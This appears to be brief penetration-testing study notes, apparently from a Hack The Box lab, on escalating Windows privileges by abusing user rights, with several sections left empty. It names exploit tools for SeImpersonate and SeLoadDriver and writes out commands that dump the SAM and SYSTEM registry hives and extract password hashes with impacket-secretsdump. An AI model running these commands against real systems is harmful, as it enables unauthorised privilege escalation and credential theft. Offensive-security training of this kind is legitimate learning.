# User Privileges 
## SeDebug
## SeTakeOwnership
## SeImpersonate
- Common tools used to exploit: [juicy_potato](https://github.com/ohpe/juicy-potato) , [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) , [Sweet Potato](SweetPotato), and PrintSpoofer
```
``
## SeLoadDriver
```
git clone https://github.com/JoshMorrison99/SeLoadDriverPrivilege # read instructions
```
## SeBackupPrivilege


```cmd prompt:C:/Users/Documents 
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
```
```prompt:htb-student~#
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Table 
